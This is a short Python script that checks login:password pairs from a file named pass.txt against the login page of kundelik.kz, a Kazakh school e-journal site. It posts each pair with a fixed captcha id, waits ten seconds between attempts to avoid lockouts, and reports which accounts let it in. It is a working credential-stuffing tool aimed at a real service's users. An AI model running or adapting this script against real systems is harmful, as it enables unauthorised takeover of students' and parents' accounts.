from urllib.request import urlopen
import requests
import time
site_url = 'https://login.kundelik.kz/'
file_name = 'pass.txt'


def internet_on():
    try:
        urlopen('http://216.58.192.142', timeout=1)
        print('[+] Подключение к интернету... ')
        return True
    except:
        print('[-] Нет подключения к интернету')
        return False


def site_on():
    try:
        urlopen(site_url, timeout=1)
        print('[+] Подключение к kundelik.kz')
        return True
    except:
        print('[-] Нет подключения к kundelik.kz')
        return False


def check_auth(text):
    logged_in = False if ("<title>Kundelik.kz | Kundelik.kz сайтына кіру</title>" in text) else True
    return logged_in


def auth(login, password):
    session = requests.Session()
    url = site_url + 'login'
    params = {
        'exceededAttempts': 'False',
        'ReturnUrl': '',
        'login': login,
        'password': password,
        'Captcha.Input': '',
        'Captcha.id': '94c0697f-cd7a-4473-b769-c0484656654f'
    }
    # Send request
    r = session.post(url, params)

    # Check auth
    if check_auth(r.text):
        print('[+]', user_login)
    else:
        print('[-]', user_login)


while internet_on() and site_on():
    f = open(file_name)
    for line in f.readlines():
        user_login = line.strip().split(':')[0]
        user_password = line.strip().split(':')[1]
        auth(user_login, user_password)
        time.sleep(10)
    print('Все готово')
    break
